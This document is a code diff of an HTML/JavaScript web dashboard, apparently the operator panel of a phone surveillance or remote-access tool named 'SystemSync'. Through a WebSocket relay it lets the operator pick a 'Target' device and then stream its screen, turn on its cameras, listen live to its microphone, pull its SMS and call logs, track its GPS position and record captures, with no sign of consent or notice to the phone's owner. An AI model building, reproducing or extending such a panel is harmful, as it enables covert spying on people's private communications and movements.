@@ -22,329 +22,306 @@
             margin: 0; display: flex; height: 100vh; overflow: hidden;
         }
 
-        /* Sidebar Navigation */
+        /* --- LOGIN OVERLAY --- */
+        #login-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.98); z-index: 2000;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+        }
+        .login-box {
+            background: var(--bg-card); padding: 40px; border-radius: 15px;
+            border: 1px solid var(--accent); text-align: center; width: 380px;
+            box-shadow: 0 0 30px rgba(0, 210, 255, 0.2);
+        }
+        #device-selector {
+            width: 100%; padding: 12px; margin: 20px 0; border-radius: 8px;
+            border: 1px solid var(--border); background: #1a1a1a; color: white; font-size: 16px;
+        }
+        .btn-connect-main {
+            width: 100%; padding: 12px; background: var(--accent); color: black;
+            font-weight: bold; border: none; border-radius: 8px; cursor: pointer;
+        }
+
+        /* --- UI LAYOUT --- */
         .sidebar {
-            width: var(--sidebar-width);
-            background: #000;
-            border-right: 1px solid var(--border);
-            display: flex; flex-direction: column; padding: 25px 0;
-            z-index: 100;
+            width: var(--sidebar-width); background: #000;
+            border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 25px 0;
+        }
+        .nav-item {
+            padding: 15px 25px; cursor: pointer; color: #888; transition: 0.3s;
+            border-left: 3px solid transparent;
+        }
+        .nav-item:hover, .nav-item.active {
+            color: var(--accent); background: rgba(0, 210, 255, 0.05);
+            border-left: 3px solid var(--accent);
         }
 
-        .brand-logo { 
-            padding: 0 30px 40px; font-size: 22px; font-weight: 800; 
-            letter-spacing: 1px; color: var(--accent);
-        }
-
-        .nav-link {
-            padding: 14px 30px; cursor: pointer; transition: 0.2s;
-            display: flex; align-items: center; gap: 15px;
-            color: #777; font-size: 14px; font-weight: 600;
-        }
-        .nav-link:hover { color: #fff; background: #111; }
-        .nav-link.active { color: var(--accent); background: #111; border-left: 4px solid var(--accent); }
-
-        /* Main Workspace */
-        .workspace { flex-grow: 1; position: relative; display: flex; flex-direction: column; overflow: hidden; }
-
-        .top-status {
-            height: 60px; padding: 0 40px; display: flex; align-items: center; justify-content: flex-end;
-            background: #000; border-bottom: 1px solid var(--border);
-        }
-
-        .view-section { 
-            display: none; padding: 40px; height: calc(100vh - 60px); 
-            overflow-y: auto; animation: slideIn 0.3s ease-out; 
-        }
+        .main-content { flex: 1; display: flex; flex-direction: column; padding: 25px; overflow-y: auto; }
+        .view-section { display: none; }
         .view-section.active { display: block; }
 
-        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
+        .card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-bottom: 20px; }
+        
+        /* Elements */
+        #screen-display { width: 100%; max-width: 450px; border-radius: 8px; border: 2px solid var(--border); }
+        .log-container { height: 400px; overflow-y: auto; background: #000; padding: 10px; border-radius: 8px; font-family: monospace; }
+        .log-row { padding: 8px; border-bottom: 1px solid #111; font-size: 13px; }
+        #map { height: 450px; border-radius: 12px; }
+        canvas { background: #000; width: 100%; height: 100px; border-radius: 8px; }
 
-        /* Phone Container */
-        .mobile-frame {
-            width: 320px; height: 640px; background: #000; border: 10px solid #1a1a1a;
-            border-radius: 40px; margin: 0 auto; position: relative; overflow: hidden;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.9);
+        .btn { 
+            padding: 10px 20px; border-radius: 6px; border: none; cursor: pointer; 
+            font-weight: bold; margin-right: 10px; transition: 0.3s;
         }
-        #main-display { width: 100%; height: 100%; object-fit: contain; }
-
-        .floating-actions {
-            position: absolute; bottom: 25px; left: 50%; transform: translateX(-50%);
-            display: flex; gap: 12px; padding: 10px 20px; border-radius: 30px;
-            background: rgba(0,0,0,0.7); backdrop-filter: blur(10px); border: 1px solid #333;
-        }
-
-        /* Audio Visualizer */
-        #audio-canvas { width: 100%; height: 200px; background: #000; border-radius: 12px; border: 1px solid var(--border); }
-
-        /* Data Containers */
-        .data-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; }
-        .log-row { padding: 12px; border-bottom: 1px solid #1a1a1a; font-size: 13px; }
-        .log-row:last-child { border: none; }
-        .search-bar { width: 100%; padding: 12px; background: #1a1a1a; border: 1px solid #333; border-radius: 8px; color: #fff; margin-bottom: 20px; }
-
-        /* Generic Buttons */
-        .btn { border: none; padding: 10px 18px; border-radius: 6px; cursor: pointer; font-weight: 700; font-size: 11px; text-transform: uppercase; }
-        .btn-accent { background: var(--accent); color: #000; }
+        .btn-primary { background: var(--accent); color: #000; }
         .btn-danger { background: var(--danger); color: #fff; }
-        .recording { animation: blink-red 1s infinite; background: var(--danger) !important; }
-        @keyframes blink-red { 50% { opacity: 0.4; } }
-
-        #map { height: 450px; border-radius: 15px; border: 1px solid var(--border); }
+        .btn-record.active { animation: blink 1s infinite; background: red; }
+        @keyframes blink { 50% { opacity: 0.5; } }
     </style>
 </head>
 <body>
-<div id="login-screen" style="position:fixed; top:0; left:0; width:100%; height:100%; background:#121212; z-index:1000; display:flex; flex-direction:column; align-items:center; justify-content:center;">
-    <h1>SystemSync Login</h1>
-    <p>Select an active device to manage:</p>
-    <select id="device-selector" style="padding:10px; width:250px; border-radius:5px; margin-bottom:20px;">
-        <option value="">Waiting for devices...</option>
-    </select>
-    <button onclick="loginToDevice()" style="padding:10px 30px; background:#00ff00; color:black; font-weight:bold; border:none; cursor:pointer;">CONNECT</button>
-</div>
-    <div class="sidebar">
-        <div class="brand-logo">SYSTEMSYNC</div>
-        <div class="nav-link active" onclick="switchTab('tab-mirror', this)">📱 Mirror Screen</div>
-        <div class="nav-link" onclick="switchTab('tab-camera', this)">📷 Live Camera</div>
-        <div class="nav-link" onclick="switchTab('tab-audio', this)">🎙 Audio Monitor</div>
-        <div class="nav-link" onclick="switchTab('tab-sms', this)">💬 SMS Inbox</div>
-        <div class="nav-link" onclick="switchTab('tab-gps', this)">📍 GPS Tracking</div>
-        <div class="nav-link" onclick="switchTab('tab-files', this)">📂 File Browser</div>
-        
-        <div class="nav-link" onclick="sendCommand('STOP_ALL')" style="margin-top: auto; color: var(--danger)">⏹ Terminate Session</div>
+
+    <div id="login-overlay">
+        <div class="login-box">
+            <h1 style="color:var(--accent); margin-bottom:5px;">SystemSync</h1>
+            <p style="color:#666">Multi-Device Control Gateway</p>
+            <select id="device-selector">
+                <option value="">Scanning for devices...</option>
+            </select>
+            <button class="btn-connect-main" onclick="connectToDevice()">ESTABLISH CONNECTION</button>
+        </div>
     </div>
 
-    <div class="workspace">
-        <div class="top-status">
-            <div id="status-dot" style="width:8px; height:8px; border-radius:50%; background:#444; margin-right:8px;"></div>
-            <span id="status-text" style="font-size:12px; color:#666">Connecting to Gateway...</span>
+    <div class="sidebar">
+        <h3 style="padding:0 25px; color:var(--accent)">CONSOLE</h3>
+        <div class="nav-item active" onclick="showSection('screen')">Live Screen</div>
+        <div class="nav-item" onclick="showSection('camera')">Camera Feed</div>
+        <div class="nav-item" onclick="showSection('audio')">Microphone</div>
+        <div class="nav-item" onclick="showSection('data')">Logs (SMS/Calls)</div>
+        <div class="nav-item" onclick="showSection('gps')">GPS Tracker</div>
+        <div class="nav-item" onclick="showSection('files')">File Explorer</div>
+    </div>
+
+    <div class="main-content">
+        <div style="display:flex; justify-content:space-between; margin-bottom:30px; align-items:center;">
+            <div>Target: <b id="display-device-name" style="color:var(--accent)">None Selected</b></div>
+            <div id="status-tag" style="color:var(--danger)">● OFFLINE</div>
         </div>
 
-        <section id="tab-mirror" class="view-section active">
-            <h2 style="margin-top:0">Remote Mirroring</h2>
-            <div class="mobile-frame">
-                <img id="main-display" src="" alt="Live Feed Standby">
-                <div class="floating-actions">
-                    <button class="btn btn-accent" onclick="toggleScreen()">START</button>
-                    <button id="recBtn" class="btn" style="background:#444" onclick="handleRecord()">REC</button>
-                    <button class="btn" style="background:#444" onclick="takeSnapshot()">📸</button>
-                </div>
+        <div id="section-screen" class="view-section active">
+            <div class="card">
+                <button class="btn btn-primary" onclick="sendCommand('START_SCREEN')">START STREAM</button>
+                <button id="record-btn" class="btn btn-danger" onclick="toggleRecording()">START RECORDING</button>
+                <p>Live View:</p>
+                <img id="screen-display" src="" alt="Waiting for stream...">
             </div>
-        </section>
+        </div>
 
-        <section id="tab-camera" class="view-section">
-            <h2>Camera Surveillance</h2>
-            <div style="display:flex; gap:10px; margin-bottom:20px">
-                <button class="btn btn-accent" onclick="sendCommand('START_CAM:BACK')">Activate Back</button>
-                <button class="btn btn-accent" onclick="sendCommand('START_CAM:FRONT')">Activate Front</button>
-                <button class="btn btn-danger" onclick="sendCommand('STOP_SCREEN')">Stop Feed</button>
-            </div>
-            <div class="mobile-frame" style="height:500px">
-                <img id="camera-feed" src="" style="width:100%; height:100%; object-fit:cover">
-            </div>
-        </section>
-
-        <section id="tab-audio" class="view-section">
-            <h2>Audio Monitoring</h2>
-            <div class="data-card">
-                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px">
-                    <button id="micBtn" class="btn btn-accent" onclick="toggleMic()">START LIVE LISTENING</button>
-                    <span id="mic-status" style="font-size:12px; color:var(--accent)">Idle</span>
-                </div>
+        <div id="section-audio" class="view-section">
+            <div class="card">
+                <button class="btn btn-primary" onclick="sendCommand('START_AUDIO')">LISTEN LIVE</button>
+                <button class="btn btn-danger" onclick="sendCommand('STOP_AUDIO')">STOP</button>
+                <p>Visualizer:</p>
                 <canvas id="audio-canvas"></canvas>
             </div>
-        </section>
+        </div>
 
-        <section id="tab-sms" class="view-section">
-            <h2>SMS Message Logs</h2>
-            <input type="text" class="search-bar" placeholder="Search by name or message content..." onkeyup="searchLogs(this, 'sms-list')">
-            <button class="btn btn-accent" style="margin-bottom:15px" onclick="sendCommand('GET_SMS')">REFRESH DATA</button>
-            <div id="sms-list" class="data-card">No data loaded.</div>
-        </section>
+        <div id="section-data" class="view-section">
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                <div class="card">
+                    <h4>SMS Inbox</h4>
+                    <button class="btn btn-primary" onclick="sendCommand('GET_SMS')">REFRESH</button>
+                    <div id="sms-list" class="log-container"></div>
+                </div>
+                <div class="card">
+                    <h4>Call History</h4>
+                    <button class="btn btn-primary" onclick="sendCommand('GET_CALLS')">REFRESH</button>
+                    <div id="call-list" class="log-container"></div>
+                </div>
+            </div>
+        </div>
 
-        <section id="tab-gps" class="view-section">
-            <h2>Geolocation Tracking</h2>
-            <button class="btn btn-accent" style="margin-bottom:20px" onclick="sendCommand('GET_GPS')">REQUEST LOCATION</button>
-            <div id="map"></div>
-        </section>
-
+        <div id="section-gps" class="view-section">
+            <div class="card">
+                <button class="btn btn-primary" onclick="sendCommand('START_GPS')">LOCATE DEVICE</button>
+                <div id="map"></div>
+            </div>
+        </div>
     </div>
 
-    <canvas id="recCanvas" style="display:none"></canvas>
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-
     <script>
-        const WS_URL = "wss://mirror-view.onrender.com";
-        const display = document.getElementById('main-display');
-        let ws, isMirroring = false, isRecording = false, isMicOn = false;
-        let selectedDeviceId = null;
+        const socket = new WebSocket('wss://mirror-view.onrender.com');
+        let currentTargetId = null;
 
-// Handle messages from server
-socket.onmessage = (event) => {
-    const msg = event.data;
+        // --- 1. WebSocket Multi-Device Routing ---
+        socket.onopen = () => {
+            socket.send("I_AM_CONTROLLER"); // Identity Handshake
+            updateStatus(true);
+        };
 
-    if (msg.startsWith("DEVICE_LIST:")) {
-        const devices = JSON.parse(msg.replace("DEVICE_LIST:", ""));
-        const selector = document.getElementById('device-selector');
-        selector.innerHTML = ""; // Clear list
-        
-        devices.forEach(dev => {
-            let opt = document.createElement('option');
-            opt.value = dev.id; // Socket ID from server
-            opt.innerHTML = dev.name; // Device Model name
-            selector.appendChild(opt);
-        });
-    }
-};
+        socket.onmessage = (event) => {
+            const data = event.data;
 
-function loginToDevice() {
-    const selector = document.getElementById('device-selector');
-    if (selector.value === "") return alert("Please select a device!");
-    
-    selectedDeviceId = selector.value;
-    const deviceName = selector.options[selector.selectedIndex].text;
-    
-    // Update the UI
-    document.getElementById('login-screen').style.display = 'none';
-    document.getElementById('device-name-display').innerText = deviceName; // Add this ID to your HTML
-    
-    // Tell server we are controlling THIS specific device
-    socket.send("SELECT_DEVICE:" + selectedDeviceId);
-}
-        // Audio Visualization Variables
-        let audioCtx, analyser, dataArray, bufferLength;
-        const audioCanvas = document.getElementById('audio-canvas');
-        const audioCtx_canvas = audioCanvas.getContext('2d');
-
-        function switchTab(tabId, el) {
-            document.querySelectorAll('.view-section').forEach(s => s.classList.remove('active'));
-            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
-            document.getElementById(tabId).classList.add('active');
-            el.classList.add('active');
-            // Auto refresh logic
-            if(tabId === 'tab-gps') setTimeout(() => map.invalidateSize(), 100);
-        }
-
-        function connect() {
-            ws = new WebSocket(WS_URL);
-            ws.onopen = () => {
-                ws.send("I_AM_WEB");
-                document.getElementById('status-dot').style.background = "#00ff00";
-                document.getElementById('status-text').innerText = "DEVICE LINKED";
-            };
-            ws.onmessage = (e) => {
-                const msg = e.data;
-                if (msg.startsWith("FRAME:")) {
-                    const data = "data:image/jpeg;base64," + msg.substring(6);
-                    display.src = data;
-                    document.getElementById('camera-feed').src = data;
-                }
-                else if (msg.startsWith("AUDIO:")) processAudio(msg.substring(6));
-                else if (msg.startsWith("SMS_DATA:")) renderSMS(msg.substring(9));
-                else if (msg.startsWith("GPS_DATA:")) renderGPS(msg.substring(9));
-            };
-            ws.onclose = () => {
-                document.getElementById('status-dot').style.background = "#444";
-                setTimeout(connect, 3000);
-            };
-        }
-
-        function sendCommand(cmd) { if (ws && ws.readyState === 1) ws.send(cmd); }
-
-        function toggleScreen() {
-            isMirroring = !isMirroring;
-            sendCommand(isMirroring ? "START_SCREEN" : "STOP_SCREEN");
-        }
-
-        // --- Live Audio & Visualization ---
-        function toggleMic() {
-            if (!audioCtx) initAudio();
-            isMicOn = !isMicOn;
-            if (isMicOn) {
-                sendCommand("START_AUDIO");
-                document.getElementById('micBtn').innerText = "STOP LISTENING";
-                document.getElementById('mic-status').innerText = "RECORDING LIVE...";
-            } else {
-                sendCommand("STOP_AUDIO");
-                document.getElementById('micBtn').innerText = "START LIVE LISTENING";
-                document.getElementById('mic-status').innerText = "Idle";
+            // Handle Device List updates
+            if (data.startsWith("DEVICE_LIST:")) {
+                const devices = JSON.parse(data.replace("DEVICE_LIST:", ""));
+                const selector = document.getElementById('device-selector');
+                selector.innerHTML = devices.length ? "" : '<option value="">No devices connected</option>';
+                devices.forEach(dev => {
+                    const opt = document.createElement('option');
+                    opt.value = dev.id;
+                    opt.innerText = dev.name;
+                    selector.appendChild(opt);
+                });
             }
+
+            // Handle specific device data
+            else if (data.startsWith("FRAME:")) {
+                const img = document.getElementById('screen-display');
+                img.src = "data:image/jpeg;base64," + data.replace("FRAME:", "");
+                if (isRecording) drawToRecordingCanvas(img);
+            }
+            else if (data.startsWith("AUDIO:")) {
+                playAudio(data.replace("AUDIO:", ""));
+            }
+            else if (data.startsWith("SMS_DATA:")) {
+                renderLogs('sms-list', data.replace("SMS_DATA:", ""));
+            }
+            else if (data.startsWith("CALL_DATA:")) {
+                renderLogs('call-list', data.replace("CALL_DATA:", ""));
+            }
+            else if (data.startsWith("GPS_DATA:")) {
+                updateMap(data.replace("GPS_DATA:", ""));
+            }
+        };
+
+        function connectToDevice() {
+            const selector = document.getElementById('device-selector');
+            if (!selector.value) return alert("Please select a device!");
+            
+            currentTargetId = selector.value;
+            socket.send("SELECT_DEVICE:" + currentTargetId);
+            
+            document.getElementById('login-overlay').style.display = 'none';
+            document.getElementById('display-device-name').innerText = selector.options[selector.selectedIndex].text;
         }
 
-        function initAudio() {
-            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            analyser = audioCtx.createAnalyser();
-            analyser.fftSize = 256;
-            bufferLength = analyser.frequencyBinCount;
-            dataArray = new Uint8Array(bufferLength);
+        function sendCommand(cmd) {
+            if (!currentTargetId) return;
+            socket.send(cmd);
+        }
+
+        // --- 2. Live Audio Engine & Visualizer ---
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const analyser = audioCtx.createAnalyser();
+        analyser.fftSize = 256;
+        const canvas = document.getElementById('audio-canvas');
+        const ctx = canvas.getContext('2d');
+
+        function playAudio(base64) {
+            const binary = atob(base64);
+            const bytes = new Int16Array(binary.length / 2);
+            for (let i = 0; i < bytes.length; i++) {
+                bytes[i] = binary.charCodeAt(i * 2) | (binary.charCodeAt(i * 2 + 1) << 8);
+            }
+            const buffer = audioCtx.createBuffer(1, bytes.length, 44100);
+            const data = buffer.getChannelData(0);
+            for (let i = 0; i < bytes.length; i++) data[i] = bytes[i] / 32768.0;
+
+            const source = audioCtx.createBufferSource();
+            source.buffer = buffer;
+            source.connect(analyser);
+            analyser.connect(audioCtx.destination);
+            source.start();
             drawVisualizer();
         }
 
-        function processAudio(base64) {
-            const binary = atob(base64);
-            const bytes = new Int16Array(binary.length / 2);
-            for (let i = 0; i < bytes.length; i++) bytes[i] = (binary.charCodeAt(i*2+1) << 8) | binary.charCodeAt(i*2);
-            
-            const buffer = audioCtx.createBuffer(1, bytes.length, 44100);
-            buffer.getChannelData(0).set(Array.from(bytes).map(v => v / 32768));
-            const source = audioCtx.createBufferSource();
-            source.buffer = buffer;
-            source.connect(analyser); // Connect to visualizer
-            analyser.connect(audioCtx.destination); // Connect to speakers
-            source.start();
-        }
-
         function drawVisualizer() {
-            requestAnimationFrame(drawVisualizer);
+            const bufferLength = analyser.frequencyBinCount;
+            const dataArray = new Uint8Array(bufferLength);
             analyser.getByteFrequencyData(dataArray);
-            audioCtx_canvas.fillStyle = '#000';
-            audioCtx_canvas.fillRect(0, 0, audioCanvas.width, audioCanvas.height);
-            
-            let barWidth = (audioCanvas.width / bufferLength) * 2.5;
-            let barHeight;
+            ctx.fillStyle = '#000'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+            const barWidth = (canvas.width / bufferLength) * 2.5;
             let x = 0;
-
             for(let i = 0; i < bufferLength; i++) {
-                barHeight = dataArray[i] / 2;
-                audioCtx_canvas.fillStyle = `rgb(0, 210, 255)`;
-                audioCtx_canvas.fillRect(x, audioCanvas.height - barHeight, barWidth, barHeight);
+                const barHeight = dataArray[i] / 2;
+                ctx.fillStyle = 'rgb(0, 210, 255)';
+                ctx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
                 x += barWidth + 1;
             }
         }
 
-        // --- GPS Logic ---
+        // --- 3. Screen Recording Logic ---
+        let mediaRecorder; let recordedChunks = []; let isRecording = false;
+        const recCanvas = document.createElement('canvas');
+        const recCtx = recCanvas.getContext('2d');
+
+        function toggleRecording() {
+            const btn = document.getElementById('record-btn');
+            if (!isRecording) {
+                recordedChunks = [];
+                const stream = recCanvas.captureStream(25);
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
+                mediaRecorder.onstop = saveVideo;
+                mediaRecorder.start();
+                isRecording = true;
+                btn.classList.add('active'); btn.innerText = "STOP RECORDING";
+            } else {
+                mediaRecorder.stop();
+                isRecording = false;
+                btn.classList.remove('active'); btn.innerText = "START RECORDING";
+            }
+        }
+
+        function drawToRecordingCanvas(img) {
+            recCanvas.width = img.naturalWidth; recCanvas.height = img.naturalHeight;
+            recCtx.drawImage(img, 0, 0);
+        }
+
+        function saveVideo() {
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a'); a.href = url;
+            a.download = `sync_capture_${Date.now()}.webm`; a.click();
+        }
+
+        // --- 4. GPS & Logs ---
         const map = L.map('map').setView([0, 0], 2);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
         let marker = L.marker([0, 0]).addTo(map);
 
-        function renderGPS(coords) {
+        function updateMap(coords) {
             const [lat, lng] = coords.split(',').map(Number);
-            map.setView([lat, lng], 16);
+            map.setView([lat, lng], 17);
             marker.setLatLng([lat, lng]);
         }
 
-        // --- SMS & Search ---
-        function renderSMS(data) {
-            const list = document.getElementById('sms-list');
-            try {
-                const sms = JSON.parse(data);
-                list.innerHTML = sms.map(m => `
-                    <div class="log-row">
-                        <b style="color:var(--accent)">${m.from}</b><br>
-                        <span>${m.body}</span>
-                    </div>
-                `).join('');
-            } catch(e) { list.innerText = data; }
+        function renderLogs(id, json) {
+            const list = document.getElementById(id);
+            const data = JSON.parse(json);
+            list.innerHTML = data.map(item => `
+                <div class="log-row">
+                    <b style="color:var(--accent)">${item.from || item.number}</b><br>
+                    <span>${item.body || 'Call Log Entry'}</span>
+                </div>
+            `).join('');
         }
 
-        function searchLogs(input, listId) {
-            const filter = input.value.toLowerCase();
-            const items = document.querySelectorAll(`#${listId} .log-row`);
-            items.forEach(el => el.style.display = el.innerText.toLowerCase().includes(filter) ? "" : "none");
+        function showSection(id) {
+            document.querySelectorAll('.view-section').forEach(s => s.classList.remove('active'));
+            document.getElementById('section-' + id).classList.add('active');
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            event.currentTarget.classList.add('active');
+            if(id === 'gps') setTimeout(() => map.invalidateSize(), 400);
         }
 
-        connect();
+        function updateStatus(online) {
+            const tag = document.getElementById('status-tag');
+            tag.innerText = online ? "● SERVER CONNECTED" : "● OFFLINE";
+            tag.style.color = online ? "#00ff00" : "#ff4b2b";
+        }
     </script>
 </body>
 </html>
-
